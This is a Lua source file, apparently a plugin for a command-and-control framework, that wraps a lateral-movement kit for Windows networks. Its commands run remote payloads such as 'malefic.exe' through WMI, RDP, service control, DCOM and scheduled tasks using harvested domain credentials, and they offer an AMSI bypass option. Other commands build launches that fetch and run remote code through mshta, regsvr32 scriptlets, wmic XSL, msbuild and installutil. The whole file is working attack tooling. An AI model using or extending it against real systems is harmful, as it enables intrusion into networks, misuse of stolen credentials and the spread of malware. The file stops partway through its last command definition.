local function move_wmi_exec(cmd, args)
    local dialog, credentials, sharpargs, cred, amsi_bypass, action, query,
          computername, command
    local session = active()
    action = cmd:Flags():GetString("action")
    query = cmd:Flags():GetString("query")
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    credentials = cmd:Flags():GetString("credentials")
    amsi_bypass = cmd:Flags():GetBool("amsi-bypass")
    sharpargs = {}
    table.insert(sharpargs, "action=" .. action)

    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if action == "create" then
        if query ~= "" or command == "" then
            error(
                "Error: If running create action specify a command not a query")
            return
        end
        table.insert(sharpargs, "command=\"" .. command .. "\"")
    elseif action == "query" then
        if query == "" or command ~= "" then
            error("Error: If running query action specify a query not a command")
            return
        end
        table.insert(sharpargs, "query=" .. query)
    end
    amsi_bypass = (amsi_bypass and "true") or "false"
    table.insert(sharpargs, "amsi=" .. amsi_bypass)
    domain_username, password = MoveKit.credentialparser(credentials)
    table.insert(sharpargs, "username=" .. domain_username)
    table.insert(sharpargs, "password=" .. password)
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end

local wmi_create_command = command("move:wmi_exec", move_wmi_exec, "", "")
wmi_create_command:Flags():String("action", "create", "(create、query)")
wmi_create_command:Flags():String("query", "", "")
wmi_create_command:Flags():String("computername", "", "(192.168.10.1)")
wmi_create_command:Flags():String("command", "", "C:\\malefic.exe")
wmi_create_command:Flags():String("credentials", "",
                                  "(domain\\username:password)")
wmi_create_command:Flags():Bool("amsi-bypass", false, "")

-- RDP
local function move_rdp(cmd, args)
    local dialog, credentials, sharpargs, cred, amsi_bypass, action, query,
          computername, command, exec_method
    local session = active()

    -- 获取命令行参数
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    exec_method = cmd:Flags():GetString("ExecMethod")
    credentials = cmd:Flags():GetString("credentials")

    -- 初始化sharpargs表
    sharpargs = {}

    -- 检查必填参数
    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if command == "" then error("Error: Please specify a command to execute") end
    table.insert(sharpargs, "command=" .. command .. "")

    local allowed_exec_methods = {"WIN+R", "Cmd", "Powershell"}
    local is_valid_exec_method = false

    for _, method in ipairs(allowed_exec_methods) do
        if exec_method == method then
            is_valid_exec_method = true
            break
        end
    end

    if not is_valid_exec_method then
        error(
            "Error: Invalid ExecMethod. Allowed values are: WIN+R, Cmd, Powershell")
    end
    if exec_method ~= "WIN+R" then
        table.insert(sharpargs, "exec=" .. exec_method)
    end

    -- 解析凭证
    if credentials ~= "" then
        domain_username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. domain_username)
        table.insert(sharpargs, "password=" .. password)
    else
        error(
            "Error: Please provide valid credentials in the format (domain\\username:password)")
    end
    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpRDP.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end
local rdp_create_command = command("move:rdp_exec", move_rdp, "", "")
rdp_create_command:Flags():String("computername", "", "(192.168.10.1)")
rdp_create_command:Flags():String("command", "", "C:\\malefic.exe")
rdp_create_command:Flags():String("ExecMethod", "WIN+R",
                                  "(Win+R、Cmd、Powershell)")
rdp_create_command:Flags():String("credentials", "",
                                  "(domain\\username:password)")
--

local function move_scm_exec(cmd, args)
    local dialog, credentials, sharpargs, cred, amsi_bypass, action,
          servicename, computername, command, session
    local session = active()

    -- 获取命令行参数
    servicename = cmd:Flags():GetString("servicename")
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    credentials = cmd:Flags():GetString("credentials")
    amsi_bypass = cmd:Flags():GetBool("amsi-bypass")

    -- 初始化sharpargs表
    sharpargs = {}
    table.insert(sharpargs, "action=scm")

    -- 检查必填参数
    if session == "" then error("Error: You did not specify a session") end

    if computername ~= "" then
        table.insert(sharpargs, "computername=" .. computername)
    end

    if command ~= "" then
        table.insert(sharpargs, "command=" .. command .. "")
    end

    if servicename ~= "" then
        table.insert(sharpargs, "servicename=" .. servicename)
    end

    if amsi_bypass then
        table.insert(sharpargs, "amsi=true")
    else
        table.insert(sharpargs, "amsi=false")
    end

    -- 解析凭证
    if credentials ~= "" then
        domain_username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. domain_username)
        table.insert(sharpargs, "password=" .. password)
    end

    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end

-- 定义move:scm命令
local scm_command = command("move:scm_exec", move_scm_exec, "", "")
scm_command:Flags():String("servicename", "", "(Service Name)")
scm_command:Flags():String("computername", "", "(192.168.10.1)")
scm_command:Flags():String("command", "", "C:\\malefic.exe")
scm_command:Flags():String("credentials", "", "(domain\\username:password)")
scm_command:Flags():Bool("amsi-bypass", false, "")

-- dcom
local function move_dcom_exec(cmd, args)
    local dialog, credentials, sharpargs, cred, amsi_bypass, action,
          computername, command, method, session
    local session = active()

    -- 获取命令行参数
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    method = cmd:Flags():GetString("method")
    credentials = cmd:Flags():GetString("credentials")
    amsi_bypass = cmd:Flags():GetBool("amsi-bypass")

    -- 初始化sharpargs表
    sharpargs = {}
    table.insert(sharpargs, "action=dcom")

    -- 检查必填参数
    if session == "" then error("Error: You did not specify a session") end

    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if command == "" then error("Error: Please specify a command to execute") end
    table.insert(sharpargs, "command=\"" .. command .. "\"")

    if method == "" then
        error("Error: Please specify a DCOM method (e.g., ShellBrowserWindow)")
    end
    table.insert(sharpargs, "method=" .. method)

    if amsi_bypass then
        table.insert(sharpargs, "amsi=true")
    else
        table.insert(sharpargs, "amsi=false")
    end

    -- 解析凭证
    if credentials ~= "" then
        domain_username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. domain_username)
        table.insert(sharpargs, "password=" .. password)
    end


    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end

-- 定义move:dcom命令
local dcom_command = command("move:dcom_exec", move_dcom_exec, "", "")
dcom_command:Flags():String("computername", "", "(192.168.10.1)")
dcom_command:Flags():String("command", "", "C:\\windows\\temp\\payload.exe")
dcom_command:Flags():String("method", "", "(ShellBrowserWindow, Excel, etc.)")
dcom_command:Flags():String("credentials", "", "(domain\\username:password)")
dcom_command:Flags():Bool("amsi-bypass", false, "")

-- taskscheduler
local function move_taskscheduler_exec(cmd, args)
    -- 定义局部变量
    local session, computername, command, taskname, credentials, amsi_bypass,
          sharpargs
    local username, password

    -- 获取当前活动会话
    session = active()

    -- 获取命令行参数
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    taskname = cmd:Flags():GetString("taskname")
    credentials = cmd:Flags():GetString("credentials")
    amsi_bypass = cmd:Flags():GetBool("amsi-bypass")

    -- 初始化sharpargs表
    sharpargs = {}
    table.insert(sharpargs, "action=taskscheduler")

    -- 检查必填参数
    if session == "" then error("Error: You did not specify a session") end

    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if command == "" then error("Error: Please specify a command to execute") end
    table.insert(sharpargs, "command=\"" .. command .. "\"")

    if taskname == "" then error("Error: Please specify a taskname") end
    table.insert(sharpargs, "taskname=" .. taskname)

    -- 处理AMSI绕过选项
    if amsi_bypass then
        table.insert(sharpargs, "amsi=true")
    else
        table.insert(sharpargs, "amsi=false")
    end

    -- 解析凭证（如果提供）
    if credentials ~= "" then
        username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. username)
        table.insert(sharpargs, "password=" .. password)
    end

    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end

-- 定义move:taskscheduler命令
local taskscheduler_command = command("move:taskscheduler",
                                      move_taskscheduler_exec, "", "")
taskscheduler_command:Flags():String("computername", "", "(192.168.10.1)")
taskscheduler_command:Flags():String("command", "",
                                     "C:\\windows\\temp\\payload.exe")
taskscheduler_command:Flags():String("taskname", "", "(e.g., Debug)")
taskscheduler_command:Flags():String("credentials", "",
                                     "(domain\\username:password)")
taskscheduler_command:Flags():Bool("amsi-bypass", false, "")

-- modifysch
local function move_modschtask_exec(cmd, args)
    -- 定义局部变量
    local session, computername, command, taskname, credentials, sharpargs
    local username, password

    -- 获取当前活动会话
    session = active()

    -- 获取命令行参数
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    taskname = cmd:Flags():GetString("taskname")
    credentials = cmd:Flags():GetString("credentials")

    -- 初始化sharpargs表
    sharpargs = {}
    table.insert(sharpargs, "action=modschtask")

    -- 检查必填参数
    if session == "" then error("Error: You did not specify a session") end

    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if command == "" then error("Error: Please specify a command to execute") end
    table.insert(sharpargs, "command=\"" .. command .. "\"")

    if taskname == "" then error("Error: Please specify a taskname") end
    table.insert(sharpargs, "taskname=" .. taskname)

    -- 解析凭证（如果提供）
    if credentials ~= "" then
        username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. username)
        table.insert(sharpargs, "password=" .. password)
    else
        error(
            "Error: Please provide valid credentials in the format (domain\\username:password)")
    end

    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    local result = execute_assembly(session, script_resource(sharpmove),
                                    sharpargs, true, new_sac())

    return result
end

-- 定义move:modschtask命令
local modschtask_command = command("move:modschtask_exec", move_modschtask_exec,
                                   "", "")
modschtask_command:Flags():String("computername", "", "(192.168.10.1)")
modschtask_command:Flags():String("command", "",
                                  "C:\\windows\\temp\\payload.exe")
modschtask_command:Flags():String("taskname", "", "(e.g., TestTask)")
modschtask_command:Flags():String("credentials", "",
                                  "(domain\\username:password)")

-- mod service
local function move_modsvc_exec(cmd, args)
    -- 定义局部变量
    local session, computername, command, servicename, amsi_bypass, sharpargs,
          credentials, username, password

    -- 获取当前活动会话
    session = active()

    -- 获取命令行参数
    computername = cmd:Flags():GetString("computername")
    command = cmd:Flags():GetString("command")
    servicename = cmd:Flags():GetString("servicename")
    amsi_bypass = cmd:Flags():GetBool("amsi-bypass")
    credentials = cmd:Flags():GetString("credentials")
    -- 初始化sharpargs表
    sharpargs = {}
    table.insert(sharpargs, "action=modsvc")

    -- 检查必填参数
    if session == "" then error("Error: You did not specify a session") end

    if computername == "" then error("Error: Please specify a computername") end
    table.insert(sharpargs, "computername=" .. computername)

    if command == "" then error("Error: Please specify a command to execute") end
    table.insert(sharpargs, "command=\"" .. command .. "\"")

    if servicename == "" then error("Error: Please specify a servicename") end
    table.insert(sharpargs, "servicename=" .. servicename)

    -- 处理AMSI绕过选项
    if amsi_bypass then
        table.insert(sharpargs, "amsi=true")
    else
        table.insert(sharpargs, "amsi=false")
    end

    -- 解析凭证（如果提供）
    if credentials ~= "" then
        username, password = MoveKit.credentialparser(credentials)
        table.insert(sharpargs, "username=" .. username)
        table.insert(sharpargs, "password=" .. password)
    else
        error(
            "Error: Please provide valid credentials in the format (domain\\username:password)")
    end

    -- 调用SharpMove程序
    local sharpmove = "MoveKit/Assemblies/SharpMove.exe"
    return execute_assembly(session, script_resource(sharpmove), sharpargs,
                            true, new_sac())
end

-- 定义move:modsvc命令
local modsvc_command = command("move:modsvc_exec", move_modsvc_exec, "", "")
modsvc_command:Flags():String("computername", "", "(e.g., remote.host.local)")
modsvc_command:Flags():String("command", "", "C:\\windows\\temp\\payload.exe")
modsvc_command:Flags():String("servicename", "", "(e.g., TestService)")
modsvc_command:Flags():Bool("amsi-bypass", false, "")

-- execute_shellcode
-- local function move_eventsubexec(cmd, args)
--     -- payloadtype $descname $exectemplate $compile $latcommand $cmdarch
--     local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
--     -- unimplemented yet
--     print("this is not implemented yet")
-- end
-- local eventsubexec_command = command("move:eventsubexec", move_eventsubexec, "",
--                                      "")
-- eventsubexec_command:Flags():String("computername", "", "(e.g., powershell)")
-- eventsubexec_command:Flags():String("credential", "", "(e.g., TestEvent)")
-- eventsubexec_command:Flags():Bool("is_x86", true, "Use x86 arch payload")

-- exceldcomexec
local function move_exceldcomexec(cmd, args)
    -- local('$payloadtype $descname $exectemplate $compile $latcommand $cmdarch');
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "Shellcode-ExecelDCOM"
    payloadtype = "raw"
    compile = "true"
    exectemplate = ""
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate
    }

    -- Movekit.prechecks(bid, listener, descname, "$2", "", null, computername,
    --                   "file", "cmd", "")
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,
                     exectemplate)
end
local exceldcomexec_command = command("move:exceldcomexec", move_exceldcomexec, "",
                                      "")
exceldcomexec_command:Flags():String("computername", "", "(e.g., remote.host.local)")
exceldcomexec_command:Flags():String("credential", "", "(e.g., TestEvent)")
exceldcomexec_command:Flags():Bool("is_x86", false, "Use x86 arch payload")

local function move_mshta_cmd(cmd,args)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "MSHTA-Command Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "mshta.hta"
    local session = active()
    local arch = session.Os.Arch
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\mshta.exe"
    else
        cmdarch = "C:\\Windows\\System32\\mshta.exe"
    end
    local lastcommand = cmdarch .. " " .. location
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local mshta_command = command("move:mshta_cmd", move_mshta_cmd, "", "")
mshta_command:Flags():String("computername", "", "(e.g., remote.host.local)")
mshta_command:Flags():String("credential", "", "")
mshta_command:Flags():String("cmdtrigger", "WMI", '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
mshta_command:Flags():Bool("amsi-bypass", false, "Use amsi bypass")
mshta_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
mshta_command:Flags():String("file_url", "", "Use file url")

-- execute 32 bit shellcode
local function move_regsvr32_cmd(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "RegSvr32-Command Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "regsvr32.sct"
    local session = active()
    local arch = session.Os.Arch
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local amsi = cmd:Flags():GetBool("amsi")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local auto = cmd:Flags():GetBool("auto")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        amsi = amsi,
        cmdtrigger = cmdtrigger,
        auto = auto
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\regsvr32.exe "
    else
        cmdarch = "C:\\Windows\\System32\\regsvr32.exe "
    end
    local lastcommand = cmdarch .. "/s /n /u /i:" .. args.location .. " scrobj.dll"
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local regsvr32_command = command("move:regsvr32_cmd", move_regsvr32_cmd, "", "")
regsvr32_command:Flags():String("computername", "", "(e.g., remote.host.local)")
regsvr32_command:Flags():String("credential", "", "")
regsvr32_command:Flags():String("file_url", "", "Use file url")
regsvr32_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
regsvr32_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Use auto")
regsvr32_command:Flags():Bool("is_x86", true, "Use x86 arch payload")
regsvr32_command:Flags():Bool("staged", false, "Use staged payload")
regsvr32_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "Use amsi bypass")

-- wmic_cmd
local function move_wmic_cmd(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "WMIC-Command Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "wmic.xsl"
    local session = active()
    local arch = session.Os.Arch
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local location = cmd:Flags():GetString("file_url")
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local amsi = cmd:Flags():GetBool("amsi")
    local auto = cmd:Flags():GetBool("auto")
    local args = {
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        cmdtrigger = cmdtrigger,
        location = location,
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        amsi = amsi,
        auto = auto
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\wbem\\wmic.exe "
    else
        cmdarch = "C:\\Windows\\System32\\wbem\\wmic.exe "
    end
    local lastcommand = ""

    lastcommand = cmdarch .. "os get name /FORMAT:" .. location
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local wmic_command = command("move:wmic_cmd", move_wmic_cmd, "", "")
wmic_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
wmic_command:Flags():String("file_url", MoveKit.movedefaults.location, "Use file url")
wmic_command:Flags():String("computername", "", "(e.g., 192.168.1.1)")
wmic_command:Flags():String("credential", "", "")
wmic_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host file")
wmic_command:Flags():Bool("is_x86", MoveKit.movedefaults.x86, "Use x86 arch payload")
wmic_command:Flags():Bool("staged", MoveKit.movedefaults.staged, "Use staged payload")
wmic_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "Use amsi bypass")

-- move msbuild
local function move_msbuild(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "MSBuild Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "msbuild.csproj"
    local session = active()
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local filename = cmd:Flags():GetString("filename")
    local droplocation = cmd:Flags():GetString("droplocation")
    local eventname = cmd:Flags():GetString("eventname")
    local auto = cmd:Flags():GetBool("auto")
    local amsi = cmd:Flags():GetBool("amsi")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        filename = filename,
        droplocation = droplocation,
        eventname = eventname,
        auto = auto,
        amsi = amsi
    }
    if x86 then
        cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe "
    else
        cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe "
    end
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        lastcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. cmdarch .. " " .. location .. "\\" .. filename
    else
        lastcommand = cmdarch .. " " .. location .. "\\" .. filename
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local msbuild_command = command("move:msbuild", move_msbuild, "", "")
msbuild_command:Flags():String("droptype", MoveKit.movedefaults.droptype, '(e.g,"WMI", "SMB")')
msbuild_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
msbuild_command:Flags():String("file_url", "", "Use file url")
msbuild_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
msbuild_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
msbuild_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
msbuild_command:Flags():String("computername", "", "(e.g., remote.host.local)")
msbuild_command:Flags():String("credential", "", "")
msbuild_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
msbuild_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
msbuild_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "AMSI Bypass")
msbuild_command:Flags():Bool("staged", false, "Use staged payload")

-- installutil
local function move_installutil(cmd, args)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "InstallUtil Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "installutil.cs"
    local session = active()
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local filename = cmd:Flags():GetString("filename")
    local droplocation = cmd:Flags():GetString("droplocation")
    local eventname = cmd:Flags():GetString("eventname")
    local auto = cmd:Flags():GetBool("auto")
    local amsi = cmd:Flags():GetBool("amsi")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        filename = filename,
        droplocation = droplocation,
        eventname = eventname,
        auto = auto,
        amsi = amsi
    }
    if x86 then
        cmdarch = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe "
    else
        cmdarch = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\installutil.exe "
    end
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        lastcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. cmdarch .. " " .. location .. "\\" .. filename
    else
        lastcommand = cmdarch .. " " .. location .. "\\" .. filename
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local installutil_command = command("move:installutil", move_installutil, "", "")
installutil_command:Flags():String("droptype", MoveKit.movedefaults.droptype, '(e.g,"WMI", "SMB")')
installutil_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
installutil_command:Flags():String("file_url", "", "Use file url")
installutil_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
installutil_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
installutil_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
installutil_command:Flags():String("computername", "", "(e.g., remote.host.local)")
installutil_command:Flags():String("credential", "", "")
installutil_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
installutil_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
installutil_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "AMSI Bypass")
installutil_command:Flags():Bool("staged", false, "Use staged payload")



-- wmic_file
local function move_wmic_file(cmd, args)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "WMIC Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "wmic.xsl"
    local session = active()
    local arch = session.Os.Arch
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local droptype = cmd:Flags():GetString("droptype")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local filename = cmd:Flags():GetString("filename")
    local droplocation = cmd:Flags():GetString("drop_location")
    local eventname = cmd:Flags():GetString("eventname")
    local auto = cmd:Flags():GetBool("auto")
    local amsi = cmd:Flags():GetBool("amsi")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        filename = filename,
        droplocation = droplocation,
        eventname = eventname,
        auto = auto,
        amsi = amsi,
        droptype = droptype
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\wmic.exe "
    else
        cmdarch = "C:\\Windows\\System32\\wmic.exe "
    end
    local lastcommand = ""
    -- latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "os get name /FORMAT:" . $3['droplocation'] ."\\"
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        lastcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. cmdarch .. "os get name /FORMAT:" .. location .. "\\"
    else
        lastcommand = cmdarch .. "os get name /FORMAT:" .. location
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local wmic_file_command = command("move:wmic_file", move_wmic_file, "", "")
wmic_file_command:Flags():String("computername", "", "(e.g., remote.host.local)")
wmic_file_command:Flags():String("credential", "", "")
wmic_file_command:Flags():String("file_url", "", "Use file url")
wmic_file_command:Flags():String("droptype", MoveKit.movedefaults.droptype, '(e.g,"WMI", "SMB")')
wmic_file_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
wmic_file_command:Flags():String("location", MoveKit.movedefaults.location, "Location")
wmic_file_command:Flags():String("drop_location", MoveKit.movedefaults.droplocation, "Drop location")
wmic_file_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
wmic_file_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
wmic_file_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
wmic_file_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
wmic_file_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "AMSI Bypass")
wmic_file_command:Flags():Bool("staged", false, "Use staged payload")


-- mshta_file
local function move_mshta_file(cmd, args)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "MSHTA Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "mshta.hta"
    local session = active()
    local arch = session.Os.Arch
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local droptype = cmd:Flags():GetString("droptype")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local filename = cmd:Flags():GetString("filename")
    local droplocation = cmd:Flags():GetString("drop_location")
    local eventname = cmd:Flags():GetString("eventname")
    local auto = cmd:Flags():GetBool("auto")
    local amsi = cmd:Flags():GetBool("amsi")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        filename = filename,
        droplocation = droplocation,
        eventname = eventname,
        auto = auto,
        amsi = amsi,
        droptype = droptype
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\mshta.exe "
    else
        cmdarch = "C:\\Windows\\System32\\mshta.exe "
    end
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        lastcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. cmdarch .. " " .. location .. "\\" .. filename
    else
        lastcommand = cmdarch .. " " .. location .. "\\" .. filename
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local mshta_file_command = command("move:mshta_file", move_mshta_file, "", "")
mshta_file_command:Flags():String("computername", "", "(e.g., remote.host.local)")
mshta_file_command:Flags():String("credential", "", "")
